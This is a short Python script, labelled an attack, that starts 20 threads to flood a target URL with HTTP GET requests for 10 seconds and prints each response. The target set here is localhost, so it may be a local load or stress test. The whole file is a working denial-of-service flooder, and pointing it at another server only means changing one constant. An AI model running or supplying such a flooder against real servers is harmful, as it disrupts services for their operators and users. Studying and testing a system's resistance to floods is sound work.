import requests
import threading
import time

# Target server URL
TARGET_URL = "http://127.0.0.1:5000/"
THREADS = 20  # Number of concurrent threads
DURATION = 10  # Duration of the attack in seconds

def flood():
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            response = requests.get(TARGET_URL)
            print(f"{response.status_code} - {response.text}")
        except Exception as e:
            print(f"Error: {e}")

# Create and start multiple threads for sending requests
thread_list = []

for _ in range(THREADS):
    t = threading.Thread(target=flood)
    t.start()
    thread_list.append(t)

# Wait for all threads to complete
for t in thread_list:
    t.join()

print("Attack completed.")
